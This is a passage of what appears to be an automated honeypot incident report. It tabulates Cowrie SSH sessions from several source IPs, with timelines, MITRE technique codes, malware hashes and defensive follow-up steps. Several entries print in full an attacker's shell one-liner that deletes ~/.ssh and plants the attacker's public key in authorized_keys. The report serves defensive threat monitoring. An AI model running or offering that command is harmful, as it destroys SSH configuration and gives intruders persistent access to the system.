| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:46:59` | `cowrie.session.connect` |
| `2026-04-13 04:46:59` | `cowrie.client.version` |
| `2026-04-13 04:46:59` | `cowrie.client.kex` |
| `2026-04-13 04:47:00` | `cowrie.login.success` |
| `2026-04-13 04:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6c5b80a58d5

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:47 |
| **Last Seen** | 2026-04-13 04:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:47:50` | `cowrie.session.connect` |
| `2026-04-13 04:47:50` | `cowrie.client.version` |
| `2026-04-13 04:47:50` | `cowrie.client.kex` |
| `2026-04-13 04:47:50` | `cowrie.login.success` |
| `2026-04-13 04:47:50` | `cowrie.session.params` |
| `2026-04-13 04:47:50` | `cowrie.command.input` |
| `2026-04-13 04:47:50` | `cowrie.command.failed` |
| `2026-04-13 04:47:50` | `cowrie.log.closed` |
| `2026-04-13 04:47:50` | `cowrie.session.params` |
| `2026-04-13 04:47:50` | `cowrie.command.input` |
| `2026-04-13 04:47:50` | `cowrie.session.file_download` |
| `2026-04-13 04:47:50` | `cowrie.log.closed` |
| `2026-04-13 04:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b500d0e9ad

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:47 |
| **Last Seen** | 2026-04-13 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:47:52` | `cowrie.session.connect` |
| `2026-04-13 04:47:52` | `cowrie.client.version` |
| `2026-04-13 04:47:52` | `cowrie.client.kex` |
| `2026-04-13 04:47:52` | `cowrie.login.success` |
| `2026-04-13 04:47:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b0d40e6e09

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:48 |
| **Last Seen** | 2026-04-13 04:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:48:24` | `cowrie.session.connect` |
| `2026-04-13 04:48:24` | `cowrie.client.version` |
| `2026-04-13 04:48:24` | `cowrie.client.kex` |
| `2026-04-13 04:48:25` | `cowrie.login.success` |
| `2026-04-13 04:48:26` | `cowrie.session.params` |
| `2026-04-13 04:48:26` | `cowrie.command.input` |
| `2026-04-13 04:48:26` | `cowrie.command.failed` |
| `2026-04-13 04:48:26` | `cowrie.log.closed` |
| `2026-04-13 04:48:27` | `cowrie.session.params` |
| `2026-04-13 04:48:27` | `cowrie.command.input` |
| `2026-04-13 04:48:27` | `cowrie.session.file_download` |
| `2026-04-13 04:48:27` | `cowrie.log.closed` |
| `2026-04-13 04:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45ea36058dc4

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:48 |
| **Last Seen** | 2026-04-13 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:48:30` | `cowrie.session.connect` |
| `2026-04-13 04:48:30` | `cowrie.client.version` |
| `2026-04-13 04:48:31` | `cowrie.client.kex` |
| `2026-04-13 04:48:32` | `cowrie.login.success` |
| `2026-04-13 04:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c5039dc572a

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:49 |
| **Last Seen** | 2026-04-13 04:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:49:58` | `cowrie.session.connect` |
| `2026-04-13 04:49:58` | `cowrie.client.version` |
| `2026-04-13 04:49:58` | `cowrie.client.kex` |
| `2026-04-13 04:49:59` | `cowrie.login.success` |
| `2026-04-13 04:50:00` | `cowrie.session.params` |
| `2026-04-13 04:50:00` | `cowrie.command.input` |
| `2026-04-13 04:50:00` | `cowrie.command.failed` |
| `2026-04-13 04:50:00` | `cowrie.log.closed` |
| `2026-04-13 04:50:01` | `cowrie.session.params` |
| `2026-04-13 04:50:01` | `cowrie.command.input` |
| `2026-04-13 04:50:01` | `cowrie.session.file_download` |
| `2026-04-13 04:50:01` | `cowrie.log.closed` |
| `2026-04-13 04:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c990ec99f4c7

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:50 |
| **Last Seen** | 2026-04-13 04:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:50:04` | `cowrie.session.connect` |
| `2026-04-13 04:50:04` | `cowrie.client.version` |
| `2026-04-13 04:50:05` | `cowrie.client.kex` |
| `2026-04-13 04:50:06` | `cowrie.login.success` |
| `2026-04-13 04:50:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b63e53fd22bb

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:51 |
| **Last Seen** | 2026-04-13 04:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:51:06` | `cowrie.session.connect` |
| `2026-04-13 04:51:06` | `cowrie.client.version` |
| `2026-04-13 04:51:07` | `cowrie.client.kex` |
| `2026-04-13 04:51:07` | `cowrie.login.success` |
| `2026-04-13 04:51:07` | `cowrie.session.params` |
| `2026-04-13 04:51:07` | `cowrie.command.input` |
| `2026-04-13 04:51:07` | `cowrie.command.failed` |
| `2026-04-13 04:51:07` | `cowrie.log.closed` |
| `2026-04-13 04:51:07` | `cowrie.session.params` |
| `2026-04-13 04:51:07` | `cowrie.command.input` |
| `2026-04-13 04:51:07` | `cowrie.session.file_download` |
| `2026-04-13 04:51:07` | `cowrie.log.closed` |
| `2026-04-13 04:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d2182933818

| Field | Detail |
|---|---|
| **Source IP** | `43.128.76[.]85` |
| **First Seen** | 2026-04-13 04:51 |
| **Last Seen** | 2026-04-13 04:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:51:09` | `cowrie.session.connect` |
| `2026-04-13 04:51:09` | `cowrie.client.version` |
| `2026-04-13 04:51:09` | `cowrie.client.kex` |
| `2026-04-13 04:51:09` | `cowrie.login.success` |
| `2026-04-13 04:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.76[.]85` to AbuseIPDB if not already reported
- [ ] Block `43.128.76[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c018c518c02

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:51 |
| **Last Seen** | 2026-04-13 04:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:51:36` | `cowrie.session.connect` |
| `2026-04-13 04:51:36` | `cowrie.client.version` |
| `2026-04-13 04:51:37` | `cowrie.client.kex` |
| `2026-04-13 04:51:38` | `cowrie.login.success` |
| `2026-04-13 04:51:38` | `cowrie.session.params` |
| `2026-04-13 04:51:38` | `cowrie.command.input` |
| `2026-04-13 04:51:38` | `cowrie.command.failed` |
| `2026-04-13 04:51:39` | `cowrie.log.closed` |
| `2026-04-13 04:51:39` | `cowrie.session.params` |
| `2026-04-13 04:51:39` | `cowrie.command.input` |
| `2026-04-13 04:51:39` | `cowrie.session.file_download` |
| `2026-04-13 04:51:39` | `cowrie.log.closed` |
| `2026-04-13 04:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0a0f8caff5d

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:51 |
| **Last Seen** | 2026-04-13 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:51:43` | `cowrie.session.connect` |
| `2026-04-13 04:51:43` | `cowrie.client.version` |
| `2026-04-13 04:51:43` | `cowrie.client.kex` |
| `2026-04-13 04:51:44` | `cowrie.login.success` |
| `2026-04-13 04:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-474b49252cba

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:54 |
| **Last Seen** | 2026-04-13 04:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:54:47` | `cowrie.session.connect` |
| `2026-04-13 04:54:47` | `cowrie.client.version` |
| `2026-04-13 04:54:48` | `cowrie.client.kex` |
| `2026-04-13 04:54:49` | `cowrie.login.success` |
| `2026-04-13 04:54:49` | `cowrie.session.params` |
| `2026-04-13 04:54:49` | `cowrie.command.input` |
| `2026-04-13 04:54:49` | `cowrie.command.failed` |
| `2026-04-13 04:54:50` | `cowrie.log.closed` |
| `2026-04-13 04:54:50` | `cowrie.session.params` |
| `2026-04-13 04:54:50` | `cowrie.command.input` |
| `2026-04-13 04:54:51` | `cowrie.session.file_download` |
| `2026-04-13 04:54:51` | `cowrie.log.closed` |
| `2026-04-13 04:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d40c83fc08d3

| Field | Detail |
|---|---|
| **Source IP** | `189.217.130[.]86` |
| **First Seen** | 2026-04-13 04:54 |
| **Last Seen** | 2026-04-13 04:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 04:54:54` | `cowrie.session.connect` |
| `2026-04-13 04:54:54` | `cowrie.client.version` |
| `2026-04-13 04:54:54` | `cowrie.client.kex` |
| `2026-04-13 04:54:55` | `cowrie.login.success` |
| `2026-04-13 04:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.217.130[.]86` to AbuseIPDB if not already reported
- [ ] Block `189.217.130[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32144550d2c3

| Field | Detail |
|---|---|
| **Source IP** | `120.52.12[.]202` |
| **First Seen** | 2026-04-13 05:54 |
| **Last Seen** | 2026-04-13 05:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 05:54:44` | `cowrie.session.connect` |
| `2026-04-13 05:54:44` | `cowrie.client.version` |
| `2026-04-13 05:54:44` | `cowrie.client.kex` |
| `2026-04-13 05:54:44` | `cowrie.login.success` |
| `2026-04-13 05:54:45` | `cowrie.session.params` |
| `2026-04-13 05:54:45` | `cowrie.command.input` |
| `2026-04-13 05:54:45` | `cowrie.command.failed` |
| `2026-04-13 05:54:45` | `cowrie.log.closed` |
| `2026-04-13 05:54:45` | `cowrie.session.params` |
| `2026-04-13 05:54:45` | `cowrie.command.input` |
| `2026-04-13 05:54:45` | `cowrie.session.file_download` |
| `2026-04-13 05:54:45` | `cowrie.log.closed` |
| `2026-04-13 05:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.12[.]202` to AbuseIPDB if not already reported
- [ ] Block `120.52.12[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-550720a2e1f6

| Field | Detail |
|---|---|
| **Source IP** | `120.52.12[.]202` |
| **First Seen** | 2026-04-13 05:54 |
| **Last Seen** | 2026-04-13 05:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 05:54:53` | `cowrie.session.connect` |
| `2026-04-13 05:54:53` | `cowrie.client.version` |
| `2026-04-13 05:54:53` | `cowrie.client.kex` |
| `2026-04-13 05:54:54` | `cowrie.login.success` |
| `2026-04-13 05:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.12[.]202` to AbuseIPDB if not already reported
- [ ] Block `120.52.12[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f14c611f8b3

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-04-13 05:55 |
| **Last Seen** | 2026-04-13 05:55 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 05:55:50` | `cowrie.session.connect` |
| `2026-04-13 05:55:50` | `cowrie.client.version` |
| `2026-04-13 05:55:51` | `cowrie.client.kex` |
| `2026-04-13 05:55:52` | `cowrie.login.success` |
| `2026-04-13 05:55:53` | `cowrie.session.params` |
| `2026-04-13 05:55:53` | `cowrie.command.input` |
| `2026-04-13 05:55:53` | `cowrie.command.failed` |
| `2026-04-13 05:55:53` | `cowrie.log.closed` |
| `2026-04-13 05:55:54` | `cowrie.session.params` |
| `2026-04-13 05:55:54` | `cowrie.command.input` |
| `2026-04-13 05:55:54` | `cowrie.session.file_download` |
| `2026-04-13 05:55:54` | `cowrie.log.closed` |
| `2026-04-13 05:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37d6d70cb763

| Field | Detail |
|---|---|
| **Source IP** | `102.213.34[.]99` |
| **First Seen** | 2026-04-13 05:55 |
| **Last Seen** | 2026-04-13 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 05:55:57` | `cowrie.session.connect` |
| `2026-04-13 05:55:57` | `cowrie.client.version` |
| `2026-04-13 05:55:58` | `cowrie.client.kex` |
| `2026-04-13 05:55:59` | `cowrie.login.success` |
| `2026-04-13 05:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.213.34[.]99` to AbuseIPDB if not already reported
- [ ] Block `102.213.34[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964c317c851b

| Field | Detail |
|---|---|
| **Source IP** | `118.193.34[.]157` |
| **First Seen** | 2026-04-13 05:58 |
| **Last Seen** | 2026-04-13 05:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
